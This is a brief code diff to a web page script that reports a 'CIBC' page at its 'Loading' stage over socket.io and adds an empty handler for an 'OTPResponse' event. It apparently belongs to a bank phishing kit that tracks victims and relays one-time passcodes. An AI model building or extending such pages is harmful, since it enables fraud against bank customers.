@@ -191,6 +191,10 @@
                     const socket = io();
 
          socket.emit('pageandstage', {page: 'CIBC', stage: 'Loading'})
+
+          socket.on('OTPResponse', (data) => {
+              
+          })
     
  
     </script>
